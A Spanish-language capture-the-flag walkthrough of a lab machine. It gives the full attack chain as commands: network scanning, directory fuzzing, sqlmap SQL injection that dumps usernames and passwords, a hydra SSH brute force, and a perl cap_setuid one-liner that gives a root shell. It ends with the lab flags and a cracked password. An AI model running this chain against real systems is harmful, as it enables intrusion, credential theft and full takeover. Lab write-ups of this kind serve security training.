
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.17 -oN escaneo
gobuster dir -u http://10.0.2.17/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 
sqlmap -u http://10.0.2.17/administrator/ --forms --dbs --batch
sqlmap -u http://10.0.2.17/administrator/ --forms -D Webapp --tables --batch 
sqlmap -u http://10.0.2.17/administrator/ --forms -D Webapp -T Users --columns --batch
sqlmap -u http://10.0.2.17/administrator/ --forms -D Webapp -T Users -C username,password --dump --batch
```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y vemos que están abiertos los puertos 22 y 80
![[Pasted image 20240305182845.png]]
Debido a esto ingresaremos en el servicio web de la máquina en el que vemos una especia de tienda así que hacemos el fuzzing web y encontramos el panel de administrator![[Pasted image 20240305183014.png]]Encontramos un panel de login en el que intentaremos usar inyecciones SQL para bypassear el panel de login
![[Pasted image 20240305183129.png]]
Ahora buscamos con sqlmap las bases de datos de la máquina y vemos que nos encuentra estas 4 de las cuales llama la atención Webapp
![[Pasted image 20240305183826.png]]
Ahora buscaremos las tablas dentro de Webapp y encontramos unicamente la tabla users
![[Pasted image 20240305184159.png]]
Entonces ahora procederemos a buscar dentro de la tabla users para ver sus columnas y encontramos 3
![[Pasted image 20240305184534.png]]
Finalmente buscamos los elementos dentro de username y password y encontramos los siguientes
![[Pasted image 20240305185215.png]]
Ahora metemos en un archivo users.txt los usuarios y en el archivo pass.txt las contraseñas y ejecutamos hydra para ver cual es el usuario correcto y encontramos que es el usuario bart con contraseña b4rtp0w4![[Pasted image 20240305185431.png]]
Ahora entramos a la máquina por ssh y encontramos la flag de user
```shell
cat user.txt
/usr/sbin/getcap -r / 2>/dev/null
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
cat /root/root.txt
```
![[Pasted image 20240305185540.png]]
No encuentro nada usando el sudo -l y la busqueda de SUID así que procedemos a hacer una búsqueda de capabilities y encontramos el perl con cap_setuid
![[Pasted image 20240305190101.png]]
Así que lo buscamos en gtfobins y encontramos un exploit que ejecutamos en consola y conseguimos ser usuario root encontrando así la flag de root de la máquina vícitma![[Pasted image 20240305190445.png]]
Flag de user: 598a05f84190e327bc4796335d948144
Flag de root: 1c4cddb6c20e0e756163b2a9714a1260